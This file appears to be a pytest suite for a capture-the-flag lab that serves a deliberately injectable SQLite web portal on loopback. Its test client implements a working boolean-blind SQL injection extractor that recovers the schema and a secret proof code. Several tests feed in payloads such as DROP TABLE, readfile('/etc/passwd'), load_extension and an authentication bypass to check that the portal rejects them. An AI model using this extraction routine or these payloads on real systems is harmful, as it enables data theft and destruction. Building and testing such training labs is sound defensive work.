"""Actual loopback HTTP and SQLite: blind extraction, boundaries, sessions and reset."""

import importlib.util
import json
import threading
import time
from http.client import HTTPConnection
from pathlib import Path

import pytest
import test_cleanup
from test_cleanup import agent

resources = test_cleanup.resources

ROOT = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location(
    "request_forge_portal", ROOT / "content/labs/request-forge/portal.py"
)
portal = importlib.util.module_from_spec(spec)
spec.loader.exec_module(portal)
FLAG = "CRA{synthetic-request-forge-test-only}"


@pytest.fixture
def live_portal():
    server = portal.Portal(("127.0.0.1", 0), FLAG)
    thread = threading.Thread(target=server.serve_forever)
    thread.start()
    try:
        yield server
    finally:
        server.shutdown()
        thread.join(3)
        server.server_close()


class Client:
    def __init__(self, server):
        self.port = server.server_port
        self.cookie = ""
        self.csrf = ""
        self.requests = 0

    def request(self, path, data=None, *, headers=None, method=None):
        self.requests += 1
        assert self.requests <= 10000
        conn = HTTPConnection("127.0.0.1", self.port, timeout=5)
        body = json.dumps(data) if data is not None else None
        request_headers = {
            "Content-Type": "application/json",
            "Cookie": self.cookie,
            "X-CSRF-Token": self.csrf,
        }
        request_headers.update(headers or {})
        try:
            conn.request(
                method or ("GET" if data is None else "POST"),
                path,
                body,
                request_headers,
            )
            response = conn.getresponse()
            raw = response.read().decode()
            content = (
                json.loads(raw)
                if response.getheader("Content-Type").startswith("application/json")
                else raw
            )
            return response.status, dict(response.getheaders()), content
        finally:
            conn.close()

    def login(self):
        status, headers, body = self.request(
            "/api/login", {"username": portal.USERNAME, "password": portal.PASSWORD}
        )
        assert status == 200
        self.cookie = headers["Set-Cookie"].split(";")[0]
        self.csrf = body["csrf"]

    def oracle(self, condition):
        status, _, body = self.request(
            "/api/search", {"reference": "NT-1042' AND (" + condition + ") -- "}
        )
        assert status == 200, body
        assert type(body["matched"]) is bool
        return body["matched"]

    def number(self, expression, upper):
        assert self.oracle(f"({expression}) >= 0")
        assert self.oracle(f"({expression}) <= {upper}")
        low, high = 0, upper
        while low < high:
            middle = (low + high) // 2
            if self.oracle(f"({expression}) > {middle}"):
                low = middle + 1
            else:
                high = middle
        assert self.oracle(f"({expression}) = {low}")
        return low

    def text(self, expression, max_length=256):
        size = self.number(f"length(({expression}))", max_length)
        return "".join(
            chr(self.number(f"unicode(substr(({expression}),{i},1))", 127))
            for i in range(1, size + 1)
        )


def test_actual_blind_discovery_and_proof(live_portal):
    client = Client(live_portal)
    client.login()
    assert client.request("/api/search", {"reference": "NT-1042"})[2] == {
        "matched": True
    }
    assert client.request("/api/search", {"reference": "NT-0000"})[2] == {
        "matched": False
    }
    assert client.oracle("1=1")
    assert not client.oracle("1=2")
    assert not client.oracle("1=2")
    assert client.oracle("1=1")
    assert client.oracle("sqlite_version() LIKE '3.%'")
    # Discover actual schema through the same boolean endpoint, no test DB reads.
    table = client.text(
        "SELECT name FROM sqlite_schema WHERE type='table' AND name!='orders' ORDER BY name LIMIT 1"
    )
    assert table == "audit_vault"
    schema = client.text(f"SELECT sql FROM sqlite_schema WHERE name='{table}'")
    assert "proof_code TEXT" in schema
    code = client.text(f"SELECT proof_code FROM {table} WHERE id=1", 16)
    assert len(code) == 16
    status, _, body = client.request("/api/proof", {"code": code})
    assert status == 200 and body == {"flag": FLAG}
    assert client.requests < 2500


def test_authentication_csrf_and_wrong_proofs(live_portal):
    first, second = Client(live_portal), Client(live_portal)
    for path, data in [
        ("/api/search", {"reference": "NT-1042"}),
        ("/api/proof", {"code": "wrong"}),
    ]:
        assert first.request(path, data)[0] == 401
    assert (
        first.request(
            "/api/login", {"username": "auditor' OR 1=1 --", "password": "wrong"}
        )[0]
        == 403
    )
    first.login()
    second.login()
    for token in ("", "invalid", second.csrf):
        assert (
            first.request(
                "/api/search", {"reference": "NT-1042"}, headers={"X-CSRF-Token": token}
            )[0]
            == 403
        )
    assert (
        first.request(
            "/api/search",
            {"reference": "NT-1042"},
            headers={"Cookie": "nt_session=wrong"},
        )[0]
        == 401
    )
    assert first.request("/api/session")[2]["csrf"] == first.csrf
    for value in ("wrong", "' OR 1=1 --", "f" * 16, "å" * 16):
        assert first.request("/api/proof", {"code": value})[0] == 403
    with live_portal.lock:
        live_portal.sessions[first.cookie.split("=", 1)[1]]["expires"] = (
            time.monotonic() - 1
        )
    assert first.request("/api/search", {"reference": "NT-1042"})[0] == 401
    first.login()
    assert first.request("/api/search", {"reference": "NT-1042"})[0] == 200


@pytest.mark.parametrize(
    "path",
    [
        "/",
        "/client.js",
        "/etc/request-forge/portal.json",
        "/portal.py",
        "/audit_vault",
        "/api/search?reference=NT-1042",
        "/api/proof",
    ],
)
def test_public_routes_never_expose_proof_or_flag(live_portal, path):
    _, _, body = Client(live_portal).request(path)
    assert FLAG not in str(body)
    assert live_portal.code not in str(body)


def test_query_is_real_read_only_and_bounded(live_portal):
    client = Client(live_portal)
    client.login()
    for reference in [
        "'",
        "x'; DROP TABLE orders; --",
        "x' UNION SELECT readfile('/etc/passwd') --",
        "x' UNION SELECT load_extension('x') --",
        "x' UNION SELECT randomblob(1000000000) --",
        "x' UNION SELECT * FROM pragma_database_list --",
    ]:
        status, _, body = client.request("/api/search", {"reference": reference})
        assert status == 400 and body == {"error": "invalid_search"}
    costly = "x' UNION SELECT 1 FROM sqlite_schema a, sqlite_schema b, sqlite_schema c, sqlite_schema d, sqlite_schema e, sqlite_schema f, sqlite_schema g, sqlite_schema h, sqlite_schema i, sqlite_schema j, sqlite_schema k, sqlite_schema l, sqlite_schema m, sqlite_schema n WHERE a.name='missing' OR length(a.name || b.name || c.name || d.name || e.name || f.name || g.name || h.name || i.name || j.name || k.name || l.name || m.name || n.name) < 0 --"
    started = time.monotonic()
    assert client.request("/api/search", {"reference": costly})[0] == 400
    assert time.monotonic() - started < 2
    assert client.request("/api/search", {"reference": "NT-1042"})[2] == {
        "matched": True
    }


@pytest.mark.parametrize(
    "data",
    [
        {},
        {"reference": []},
        {"reference": 1},
        {"reference": ""},
        {"reference": "x" * 1025},
        {"reference": "NT-1042", "tenant": "internal"},
        {"reference": "\ud800"},
        [],
    ],
)
def test_invalid_fields_are_rejected(live_portal, data):
    client = Client(live_portal)
    client.login()
    assert client.request("/api/search", data)[0] == 400


def test_protocol_limits(live_portal):
    client = Client(live_portal)
    client.login()
    assert (
        client.request(
            "/api/search",
            {"reference": "NT-1042"},
            headers={"Content-Type": "text/plain"},
        )[0]
        == 415
    )
    assert client.request("/api/search", {"reference": "x" * 5000})[0] == 413
    assert (
        client.request(
            "/api/search",
            {"reference": "NT-1042"},
            headers={"Transfer-Encoding": "chunked"},
        )[0]
        == 400
    )
    conn = HTTPConnection("127.0.0.1", live_portal.server_port, timeout=5)
    try:
        conn.putrequest("POST", "/api/search")
        conn.putheader("Content-Length", "2")
        conn.putheader("Content-Length", "3")
        conn.endheaders(b"{}")
        response = conn.getresponse()
        assert response.status == 400
        response.read()
    finally:
        conn.close()


def test_flag_scope_rotates_proof_on_generation_and_owner_change(resources):
    _, command, _, _, _ = resources
    command.mission_id, command.mission_version = "request-forge", 1
    (agent.runtime.SECRETS / "flags.key").write_bytes(
        b"synthetic-request-forge".ljust(32, b"0")
    )
    flag = agent.flag_value(command)
    code = portal.proof_code(flag)
    assert code == portal.proof_code(agent.flag_value(command))
    assert flag not in "".join(agent.target_pages(command).values())
    command.generation += 1
    new_flag = agent.flag_value(command)
    assert new_flag != flag and portal.proof_code(new_flag) != code
    from uuid import uuid4

    command.user_id = uuid4()
    assert agent.flag_value(command) != new_flag


def test_recreated_database_preserves_code_but_rotates_sessions():
    previous_cookie = ""
    original_code = portal.proof_code(FLAG)
    for flag in (FLAG, FLAG, FLAG + "-next-generation"):
        server = portal.Portal(("127.0.0.1", 0), flag)
        thread = threading.Thread(target=server.serve_forever)
        thread.start()
        try:
            client = Client(server)
            client.cookie = previous_cookie
            assert client.request("/api/session")[0] == 401
            client.login()
            previous_cookie = client.cookie
            status, _, _ = client.request("/api/proof", {"code": original_code})
            assert status == (200 if flag == FLAG else 403)
            assert (
                client.request("/api/proof", {"code": portal.proof_code(flag)})[0]
                == 200
            )
        finally:
            server.shutdown()
            thread.join(3)
            server.server_close()


def test_recipe_sends_only_brief_to_operator(monkeypatch):
    import request_forge_recipe as recipe

    writes, uploads, calls = [], [], []
    monkeypatch.setattr(
        recipe.course_recipes,
        "root_file",
        lambda target, path, text, guest, mode="0644": writes.append(
            (target, path, text, mode)
        ),
    )
    monkeypatch.setattr(
        recipe.lab_tools,
        "upload",
        lambda name, path, data: uploads.append((name, path, data)),
    )
    guest = lambda target, command: calls.append((target, command))
    recipe.setup(
        None, "synthetic-target", ["synthetic-operator"], [{"subnet": 20}], FLAG, guest
    )
    assert len(uploads) == 3
    assert all(
        FLAG.encode() not in data and b"audit_vault" not in data
        for _, _, data in uploads
    )
    private = [entry for entry in writes if FLAG in entry[2]]
    assert (
        len(private) == 1
        and private[0][0] == "synthetic-target"
        and private[0][3] == "0640"
    )
    assert not any(
        "setup_access" in command or "sudoers" in command for _, command in calls
    )
    with pytest.raises(ValueError):
        recipe.setup(
            None,
            "target",
            ["one", "two"],
            [{"subnet": 20}, {"subnet": 21}],
            FLAG,
            guest,
        )
